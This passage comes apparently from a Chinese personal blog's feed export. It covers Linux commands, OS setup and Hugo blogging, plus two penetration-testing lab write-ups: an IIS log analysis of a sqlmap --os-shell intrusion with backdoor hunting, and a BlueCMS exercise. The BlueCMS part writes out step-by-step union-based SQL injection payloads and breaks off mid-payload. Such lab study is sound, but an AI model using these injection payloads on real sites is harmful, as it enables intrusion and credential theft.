（windows：必须大写）</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225163324758.png" alt="image-20211225163324758"></p><p>​    查询域名ip地址信息 </p><p>​    <code>nslookup baidu.com</code></p><p>服务类</p><p>​    查看系统进程</p><p>​    <code>ps -aux</code> （通常和kill -9一起使用&amp;最常用法是：ps -ef | grep xxx:查询某个关键字）         a:显示所有程序         u:以用户为主的格式来显示         x:显示所有程序，不以终端机来区分 </p><p>ps看到的是命令执行瞬间的进程信息,而top可以持续的监视 </p><p>ps只是查看进程,而top还可以监视系统性能,如平均负载,cpu和内存的消耗</p><p><code>top</code></p><p>top还可以操作进程,如改变优先级(命令r)和关闭进程(命令k) top主要看cpu,内存使用情况，及占用资源最多的进程由高到低排序，关注点在 于资源占用情况，但是查看内存占用是不准确的</p><p>查看内存： </p><p><code>free -h</code>       自动转换单位(常用)</p><pre><code>     -b         Byte显示</code></pre><p>​        -k          KB显示</p><p>​        -m         MB显示</p><p>​        -g          GB显示</p><p>​        -o         不显示缓冲区 </p><p>​        -t         显示内存总和列</p><p>​        -s         间隔n秒，持续查看 内存总数 已使用总数 空闲内存 多个进程共享的内存</p><p>设置服务</p><p>​    systemctl </p><p>​        restart xxx //重启或这重新加载服务 </p><p>​        start //启动服务 </p><p>​        stop //停止服务，关机或重新启动会失效 </p><p>​        status //查看服务执行信息和有没有开机启动的信息 </p><p>​        enable //设置服务开机启动 </p><p>​        disable //设置服务开机不启动</p><p>结束进程</p><p>​     kill    </p><p>​         -1(HUP) 重载进程</p><p>​        -9(KILL) 杀死一个进程</p><p>​        -15(TERM) 正常停止进程</p><p>显示当前系统信息        </p><p>w</p><p>显示当前登录的用户</p><p>who</p><p>特殊操作 切换和隐藏程序执行窗口，只有主动停止或者关机重启，程序才会停止，有点类似windows的最 小化 在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始 流行的Linux发行版（例如Red Hat Enterprise Linux）通常会自带screen实用程序，如 果没有的话，可以从GNU screen的官方网站下载</p><p><code>yum install -y screen</code></p><p> <code>screen -ls</code>列出所有后台的会话</p><p><code>screen -S name1 vim</code> 给窗口命名</p><p><code>screen -r 窗口号</code>重新打开会话窗口</p><p>后台 control + a + d 切换窗口</p><p><code>screen -rd name1</code>将指定的窗口离线或恢复离线</p><p>后台挂起运行</p><p><code>nohup</code></p><p><code>nohup ping 8.8.8.8 &amp;</code>        //不加 &amp; 的话，关闭窗口会中断执行</p><p>fg 显示后台挂起的程序</p><p>显示目录文件大小</p><p>du 文件名</p><p>显示当前目录下的文件所占用的空间</p><p>du -sh</p><p>查看磁盘被占用的信息</p><p>df</p><p>防火墙(/etc/services)</p><p> <code>ystemctl start firewalld</code> 启动</p><p> <code>systemctl stop firewalld</code> 停止</p><p> <code>firewall-cmd --reload</code> 重新加载防火墙</p><p><code>firewall-camd --state</code> 查看运行状态</p><p><code>firewall-cmd --zone=public --list-ports </code> 显示当前允许通过的端口信息</p><p><code>firewall-cmd --zone=public --list-service</code> 显示当前允许通过的服务</p><p><code>firewall-cmd --zone=public --add-port=80/tcp --permanent</code> 允许哪个端口可以通过</p><p><code>firewall-cmd --zone=public --add-service=http --permanent</code> 允许哪个服务可以通过</p><p><code>firewall-cmd --zone=public --remove-port=http --permanent</code> 删除指定的端口</p><p>开启一个网页端的端口</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">8080</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7配置网卡为静态IP</title>
      <link href="/2021/12/25/centos7%E9%85%8D%E7%BD%AE%E7%BD%91%E5%8D%A1%E4%B8%BA%E9%9D%99%E6%80%81IP/"/>
      <url>/2021/12/25/centos7%E9%85%8D%E7%BD%AE%E7%BD%91%E5%8D%A1%E4%B8%BA%E9%9D%99%E6%80%81IP/</url>
      
        <content type="html"><![CDATA[<p>1． 打开虚拟机后，桌面右键打开Open Terminal</p><p>2． 使用命令 su 切换到root账户</p><p>3． 用vim编辑器打开网卡配置文件</p><p>4． Vim /etc/sysconfig/network-scripts/ifcfg-ens33</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153113536.png" alt="image-20211225153113536"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153131923.png" alt="image-20211225153131923"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153131923.png"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153208160.png" alt="image-20211225153208160"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153225002.png" alt="image-20211225153225002"></p><p>5.然后按ESC然后按Shiftt+: 冒号进入命令行模式输入 “wq”保存退出</p><p>6.使用命令重启网卡 systemctl restart network</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225153250495.png" alt="image-20211225153250495"></p>]]></content>
      
      
      
        <tags>
            
            <tag> centos7 </tag>
            
            <tag> 网卡配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu安装</title>
      <link href="/2021/12/25/ubuntu/"/>
      <url>/2021/12/25/ubuntu/</url>
      
        <content type="html"><![CDATA[<h1 id="在虚拟机安装ubuntu系统"><a href="#在虚拟机安装ubuntu系统" class="headerlink" title="在虚拟机安装ubuntu系统"></a>在虚拟机安装ubuntu系统</h1><p>\1.   先到 <a href="https://ubuntu.com/%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6">https://ubuntu.com/下载镜像文件</a></p><p>​         <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152032412.png" alt="image-20211225152032412"></p><p>​       <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152204645.png" alt="image-20211225152204645">        </p><p> \2.   下载完成后启动虚拟机</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152240480.png" alt="image-20211225152240480"></p><p>​        </p><pre><code>     ![image-20211225152255088](https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152255088.png)      ![image-20211225152320738](https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152320738.png)</code></pre><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152342209.png" alt="image-20211225152342209"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152358941.png" alt="image-20211225152358941"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152409445.png" alt="image-20211225152409445"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152422670.png" alt="image-20211225152422670"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152620102.png" alt="image-20211225152620102"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152447496.png" alt="image-20211225152447496"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152637502.png" alt="image-20211225152637502"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152657553.png" alt="image-20211225152657553"></p><pre><code>   建议安装时，语言选择英文，然后默认“下一步（continue）”即可完成安装</code></pre><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225152727579.png" alt="image-20211225152727579"></p><p>​        安装完成后，重新启动，即可正常使用 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hugo第一次搭建博客</title>
      <link href="/2021/12/23/Hugo/"/>
      <url>/2021/12/23/Hugo/</url>
      
        <content type="html"><![CDATA[<p>一.环境安装</p><p>​    1. go语言</p><p>​    2. git</p><p>二.安装Hugo</p><p>​    1.到<a href="https://github.com/spf13/hugo/releases">Hugo Releases</a> 下载对应的操作系统版本的Hugo二进制文件</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219103422194.png" alt="image-20211219103422194"></p><p>​    2.将下载的压缩包解压到任意盘符的根目录下</p><p>​        2.1创建Hugo文件夹</p><p>​            1.创建一个新的文件夹,D:\Hugo</p><p>​            2.创建一个新的文件夹,D:\Hugo\bin</p><p>​            3.创建一个新的文件夹,D:\Hugo\myblog        </p><p>​        我是在D:盘目录下新建了一个Hugo的文件夹,解压到这个文件夹下</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219094839939.png"></p><p>​    3.设置环境变量</p><p>​        3.1把Hugo添加到path中，我的电脑（此电脑）右键属性，在高级里面，选择环境变量</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219103924062.png" alt="image-20211219103924062"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219104008570.png" alt="image-20211219104008570"></p><p>​        下面系统变量同上</p><p>​    4.部署Hugo</p><p>​        4.1验证Hugo的环境变量是否正确，打开CMD窗口（windows+r,输入cmd）运行 Hugo version</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219104402077.png" alt="image-20211219104402077"></p><p>​        4.2新生成一个博客站点（文件夹）红框里面的名字可以随意更改</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219105053824.png" alt="image-20211219105053824"></p><p>​        4.3这个myblog就是博客的根目录了</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219105331540.png" alt="image-20211219105331540"></p><p>5.给博客设置一个<a href="https://themes.gohugo.io/">主题</a></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219110020648.png" alt="image-20211219110020648"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219110504744.png" alt="image-20211219110504744"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219110541084.png" alt="image-20211219110541084">        </p><p>可以使用 git clone 下载，也可以点击下面的 Download ZIP 下载，解压到博客的主题目录下</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219110859540.png" alt="image-20211219110859540"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219111141465.png" alt="image-20211219111141465"></p><p>​        5.1 启动博客站点</p><p>​        在博客的根目下运行 m10c 是主题的 文件夹 名字</p><p>​        <code>hugo server -t m10c --buildDrafts</code></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219111623813.png" alt="image-20211219111623813"></p><p>​        5.3看见 <a href="http://localhsot:1313/">http://localhsot:1313/</a> 表示启动成功，输入到浏览器打开看看</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219111836541.png" alt="image-20211219111836541"></p><p>​        5.2在博客根目录下新建一篇文章</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219112523887.png" alt="image-20211219112523887"></p><p>​        ps:以.md结尾</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219112653753.png" alt="image-20211219112653753"></p><p>​    双击打开编辑或者右键指定记事本打开都可以，可以随意写点内容测试一下</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219113240436.png" alt="image-20211219113240436"></p><p>​    回到博客根目录下 打上面的启动命令 看看</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219113340282.png" alt="image-20211219113340282"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219113358218.png" alt="image-20211219113358218"></p><p>​    ok.</p><p>三.部署到Github Page上</p><p>​    1.到<a href="github.com">Github</a>上注册一个账号，</p><p>​    2.新建一个仓库</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219114031785.png" alt="image-20211219114031785"></p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219114704106.png" alt="image-20211219114704106"></p><p>​    Repository     name:的名字必须全小写且和你的昵称一样，然后点击下面绿色的创建</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219114952664.png" alt="image-20211219114952664"></p><p>此时是一个空的仓库</p><p>​    3.接下来把自己的博客部署到github上来</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219115733638.png" alt="image-20211219115733638"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219115822346.png" alt="image-20211219115822346"></p><p>博客的根目录下会生成一个 public  的文件夹，这个文件夹里面的文件就是自己博客的内容</p><ol start="4"><li><p>接下来把 public 这个文件夹传到自己 git 仓库，博客就可以在远程访问了</p><p> 先进入到 public 这个文件夹中</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219120241839.png" alt="image-20211219120241839"></p><p> 然后 <code>git init</code> 进行初始化</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219120337995.png" alt="image-20211219120337995"></p></li></ol><p>​      把所有文件加进去</p><p>​      <code>git add *</code></p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219120510949.png" alt="image-20211219120510949"></p><p>​    然后提交</p><p>​    <code>git commit -m "随便起名字"</code></p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219120807383.png" alt="image-20211219120807383"></p><p>​    5.GitHub关联本地的文件</p><p>​        <code>git remote add origin xxxxx.git</code></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219123322136.png" alt="image-20211219123322136"></p><p>​    推到git 仓库上面去</p><p>​    <code>git push -u origin master</code></p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219124542741.png" alt="image-20211219124542741"></p><p>6.到自己的仓库看了一下有没有推成功，有文件表示成功</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211219124650041.png" alt="image-20211219124650041"><a href="https://hexo.io/docs/one-command-deployment.html">https://hexo.io/docs/one-command-deployment.html</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hugo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载编程随想</title>
      <link href="/2021/12/23/%E8%BD%AC%E8%BD%BD%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"/>
      <url>/2021/12/23/%E8%BD%AC%E8%BD%BD%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="博客开张及本博客内容简介"><a href="#博客开张及本博客内容简介" class="headerlink" title="博客开张及本博客内容简介"></a><a href="https://program-think.blogspot.com/2009/01/test.html">博客开张及本博客内容简介</a></h1><p>很久以前就想开一个博客，可惜一直忙于工作中，不能如愿。<br>拜2008年的全球金融危机所赐，我不再像以前那么忙碌，终于能够抽时间把以前的一些经验和平时的一些心得体会写下来。<br>希望这个博客能够让读者有所收获。</p><p>初步考虑写如下一些方面的内容：<br>★对于开发人员的个人发展和成长的体会<br>主要介绍一些方法论相关的东东（比如：学习方法、思维方式、做事习惯等），毕竟“<strong>授人以鱼不如授人以渔</strong>”。<br>★关于 C++、Java、Python 语言<br>主要介绍和编程语言相关的开发经验。会比较侧重于开发跨平台，高性能、可扩展性方面的话题。<br>★关于软件工程<br>主要介绍软件工程相关的知识、项目管理的经验、复杂系统的架构设计等。<br>★关于管理<br>主要介绍企业管理相关的经验和职场心得。</p><p>如果有空，我也会顺便八卦一下 IT 业界的新动态。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows异常服务排查实验</title>
      <link href="/2021/03/19/Windows%E5%BC%82%E5%B8%B8%E6%9C%8D%E5%8A%A1%E6%8E%92%E6%9F%A5%E5%AE%9E%E9%AA%8C/"/>
      <url>/2021/03/19/Windows%E5%BC%82%E5%B8%B8%E6%9C%8D%E5%8A%A1%E6%8E%92%E6%9F%A5%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows异常服务排查实验"><a href="#Windows异常服务排查实验" class="headerlink" title="Windows异常服务排查实验"></a>Windows异常服务排查实验</h1><h2 id="通过IIS日志分析SqlMap-–os-shell的原理"><a href="#通过IIS日志分析SqlMap-–os-shell的原理" class="headerlink" title="通过IIS日志分析SqlMap –os-shell的原理"></a>通过IIS日志分析SqlMap –os-shell的原理</h2><h3 id="目标-http-172-16-12-2"><a href="#目标-http-172-16-12-2" class="headerlink" title="目标:  http://172.16.12.2/"></a>目标:  <a href="http://172.16.12.2/">http://172.16.12.2/</a></h3><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210922346.png" alt="image-20220318005729500"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># sqlmap </span><br><span class="line">sqlmap -u "http://172.16.12.2/info.aspx?id=2" --os-shell -v 3 </span><br><span class="line"># 检测是否为DBA的权限</span><br><span class="line"># 检测是否开启了扩展存储 xp_cmdshell, 如果没开启, sqlmap就会尝试开启</span><br><span class="line"># 原理主要是利用 扩展存储函数 xp_cmdshell 进行命令执行数据外带. </span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210922956.png" alt="image-20220317225805869"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210922196.png" alt="image-20220317225947852"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210922172.png" alt="image-20220317230404309"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210922308.png" alt="image-20220317230615870"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210922922.png" alt="image-20220317230958050"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210922684.png" alt="image-20220317231538130"></p><p><strong>查看日志</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># kali使用 remmina 连接服务器. windows在cmd命令窗口 rdesktop IP 连接服务器</span><br><span class="line">帐号密码: administrator : ICQsafe666</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923088.png" alt="image-20220317232031089"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923416.png" alt="image-20220317232541135"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923574.png" alt="image-20220317232106575"></p><p><strong>日志分析</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">打开命令窗口输入: eventvwr.msc , 打开事件查看器</span><br><span class="line">导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析</span><br><span class="line">计算机开启web服务，查看web日志 日志路径：C:\inetpub\logs\LogFiles\W3SVC1</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923966.png" alt="image-20220317232726612"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923238.png" alt="image-20220317234432564"></p><p>可以看见大量的 sql 语句, 表示被注入攻击.<br>从web日志中发现大量 xp_cmdshell，表明攻击者使用 xp_cmdshell 攻击服务器，且获取了系统权限.</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923707.png" alt="image-20220317234647666"><br><img src="E:/img/image-20220317234000589.png" alt="image-20220317234000589"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923459.png" alt="image-20220317234216373"></p><hr><h3 id="其他入侵排查"><a href="#其他入侵排查" class="headerlink" title="其他入侵排查"></a><strong>其他入侵排查</strong></h3><h4 id="1、检查端口及其相对应的进程程序"><a href="#1、检查端口及其相对应的进程程序" class="headerlink" title="1、检查端口及其相对应的进程程序"></a>1、检查端口及其相对应的进程程序</h4><pre><code>netstat -ano 查看网络连接，定位可疑的进程根据netstat定位的pid， 通过 tasklist | findstr "pid" 定位其进程程序</code></pre><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923467.png" alt="image-20220318000018435"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923289.png" alt="image-20220317235920684"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 导出进程信息</span><br><span class="line">wmic process get caption,commandline /value &gt;&gt; tmp.txt # 路径在C:\Users\Administrator</span><br><span class="line"># 可以看到3389端口的macfee.exe程序时附带了异常参数，疑似后门程序. </span><br><span class="line"># 打开macfee.exe程序所在目录，并先关闭macfee.exe</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923297.png" alt="image-20220318000815890"></p><h4 id="2、检查启动项、计划任务、服务"><a href="#2、检查启动项、计划任务、服务" class="headerlink" title="2、检查启动项、计划任务、服务"></a>2、检查启动项、计划任务、服务</h4><pre><code>启动项检查单击 【开始】》【所有程序】》【启动】，默认为空目录，确认是否有可疑文件在该目录下</code></pre><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210923982.png" alt="image-20220318001104218"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Win + R , 输入 msconfig , 查看是否存在异常的启动项, 下图显示存在一个 sysconf 的启动项. 打开对应的脚本，以及注册表，显示这个开机启动脚本为macfee.exe自启动脚本，为后门文件. </span><br><span class="line"></span><br><span class="line">Win+R，输入regedit，打开注册表，查看开机启动项是否正常，特别注意以下2个注册表项, 是否存在可疑项，如果有则删除. </span><br><span class="line">1. HKEY_CURRENT_USER\software\microsoft\windows\currentversion</span><br><span class="line">2. HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210924579.png" alt="image-20220318001601841"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210924057.png" alt="image-20220318002303807"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210924495.png" alt="image-20220318003002539"></p><h4 id="3、组策略，WIN-R，运行-gpedit-msc，查看是否存在启动脚本"><a href="#3、组策略，WIN-R，运行-gpedit-msc，查看是否存在启动脚本" class="headerlink" title="3、组策略，WIN+R，运行 gpedit.msc，查看是否存在启动脚本"></a>3、组策略，WIN+R，运行 gpedit.msc，查看是否存在启动脚本</h4><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203210924371.png" alt="image-20220318003259513"></p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub靶机 </tag>
            
            <tag> 注入 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueCMS + phpmyadmin</title>
      <link href="/2021/03/18/BlueCMS%20+%20phpmyadmin/"/>
      <url>/2021/03/18/BlueCMS%20+%20phpmyadmin/</url>
      
        <content type="html"><![CDATA[<h1 id="BlueCMS与phpmyadmin"><a href="#BlueCMS与phpmyadmin" class="headerlink" title="BlueCMS与phpmyadmin"></a>BlueCMS与phpmyadmin</h1><h2 id="要求"><a href="#要求" class="headerlink" title="要求:"></a>要求:</h2><p>​        完成Sqlmap工具 - 扩展实验 - 任意存在宽字节注入的CMS<br>​        利用BlueCMS  sql注入漏洞手工注入查询后台管理员密码, 后台拿shell<br>​        通过sql注入查mysql账户密码, 利用phpmyadmin组合拿shell (不少于两种)</p><h2 id="目标-http-172-16-12-2-uploads-index-php"><a href="#目标-http-172-16-12-2-uploads-index-php" class="headerlink" title="目标: http://172.16.12.2/uploads/index.php"></a>目标: <a href="http://172.16.12.2/uploads/index.php">http://172.16.12.2/uploads/index.php</a></h2><h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><h4 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">发现在 http://172.16.12.2/uploads/ad_js.php 中存在注入点</span><br><span class="line">手工注入</span><br><span class="line">?ad_id=1'--+ # 有报错, 且不是sql语句类型的报错, 不能使用报错注入</span><br><span class="line">?ad_id=2-1--+ # 没有报错, 判断是数字型注入</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138606.png" alt="image-20220317154204714"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138736.png" alt="image-20220317154219048"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138012.png" alt="image-20220317154307719"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138636.png" alt="image-20220317154319876"></p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 未报错</span><br><span class="line">?ad_id=1 order by 5--+</span><br><span class="line"># 报错了, 说明字段数不是10个</span><br><span class="line">?ad_id=1 order by 10--+</span><br><span class="line"># 知道字段数是7 , 直接就这样写了吧</span><br><span class="line">?ad_id=1 order by 7--+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138769.png" alt="image-20220317154605729"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138887.png" alt="image-20220317154710105"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138288.png" alt="image-20220317154932075"></p><h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 显示位置是 7 </span><br><span class="line">?ad_id=1 union select 1,2,3,4,5,6,7--+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138047.png" alt="image-20220317155116531"></p><h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><h5 id="库"><a href="#库" class="headerlink" title="库"></a>库</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 当前库</span><br><span class="line">?ad_id=1 union select 1,2,3,4,5,6,database()--+</span><br><span class="line"># 所有库</span><br><span class="line">?ad_id=1 union select 1,2,3,4,5,6,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181138127.png" alt="image-20220317155342709"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139234.png" alt="image-20220317155423732"></p><h5 id="表"><a href="#表" class="headerlink" title="表"></a>表</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 爆出blue的表, 报错了, 编码试试</span><br><span class="line">?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema='Mysql'--+</span><br><span class="line"></span><br><span class="line"># 爆出blue的表</span><br><span class="line">?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139763.png" alt="image-20220317160120409"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139613.png" alt="image-20220317160320214"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139139.png" alt="image-20220317160001430"></p><h5 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=CHAR(77, 121, 115, 113, 108) and table_name=CHAR(98, 108, 117, 101, 95, 97, 100, 109, 105, 110) --+</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202203181139003.png" alt="image-20220317160528782"></p><h5 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?ad_id=1 union select 